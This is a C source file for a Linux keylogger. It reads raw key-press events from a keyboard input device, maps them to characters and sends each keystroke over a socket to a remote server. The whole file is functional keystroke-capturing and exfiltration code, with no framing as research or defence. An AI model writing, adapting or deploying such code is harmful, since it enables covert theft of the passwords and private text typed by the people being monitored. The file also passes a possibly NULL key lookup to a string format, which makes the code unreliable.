#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include "keylog.h"  // Include the header file
#include "messageManager.h"
#include "utils.h"

typedef struct {
    int key_code;
    char ascii_char[20];
} KeyCodeMap;

// Mapping of XT key codes to ASCII characters
KeyCodeMap xt_to_ascii_map[] = {
    {0x1E, "a"}, {0x30, "b"}, {0x2E, "c"}, {0x20, "d"}, {0x12, "e"}, {0x21, "f"}, {0x22, "g"},
    {0x23, "h"}, {0x17, "i"}, {0x24, "j"}, {0x25, "k"}, {0x26, "l"}, {0x32, "m"}, {0x31, "n"},
    {0x18, "o"}, {0x19, "p"}, {0x10, "q"}, {0x13, "r"}, {0x1F, "s"}, {0x14, "t"}, {0x16, "u"},
    {0x2F, "v"}, {0x11, "w"}, {0x2D, "x"}, {0x15, "y"}, {0x2C, "z"}, {0x02, "1"}, {0x03, "2"},
    {0x04, "3"}, {0x05, "4"}, {0x06, "5"}, {0x07, "6"}, {0x08, "7"}, {0x09, "8"}, {0x0A, "9"},
    {0x0B, "0"}, {0x1C, "<ENTER>"}, {0x39, "<SPACE>"}, {0x0E, "<BACKSPACE>"}, {0x0F, "<TAB>"},
    {0x1A, "["}, {0x1B, "]"}, {0x27, ";"}, {0x28, "'"}, {0x29, "`"}, {0x2B, "\\"}, {0x33, ","},
    {0x34, "."}, {0x35, "/"}, {0x0D, "="}, {0x0C, "-"},
    
    // Add additional keys
    {0x7F, "<DEL>"},  // DEL (Delete key)
    {0x2A, "<SHIFT>"}, // Left SHIFT key
    {0x36, "<SHIFT>"}, // Right SHIFT key
};

// Function to convert XT key code to ASCII
char* xt_to_ascii(int key_code) {
    int map_size = sizeof(xt_to_ascii_map) / sizeof(xt_to_ascii_map[0]);
    for (int i = 0; i < map_size; i++) {
        if (xt_to_ascii_map[i].key_code == key_code) {
            return xt_to_ascii_map[i].ascii_char;
        }
    }
    
    return NULL;  // Return null character if key code not found
}

// Function to capture keystrokes and send them to the server
void start_keylogger(int sock, const char *device_path) {
    struct input_event ev;
    int fd;
    ssize_t n;
    char buffer[256];

    // Open the input device (keyboard device)
    fd = open(device_path, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open input device");
        return;
    }

    // Capture and send key events
    while (1) {
        n = read(fd, &ev, sizeof(struct input_event));
        if (n == (ssize_t)-1) {
            perror("Read error");
            break;
        }
        //printf("Ev.type=%d\n", ev.type);
        if (ev.type == EV_KEY) {  
            //printf("Key event: code=%d, value=%d\n", ev.code, ev.value);
            if (ev.value == 1) {  
                snprintf(buffer, sizeof(buffer), "%s", xt_to_ascii(ev.code));
                printf("Sending: %s\n", buffer);
                message_t msg;
                strcpy(msg.buffer, buffer);
                msg.opCode='K';
                msg.size=strlen(buffer);
                send_message(sock, &msg);
                printf("Value sent\n");
            }
        }
    }

    // Close the device file
    close(fd);
}
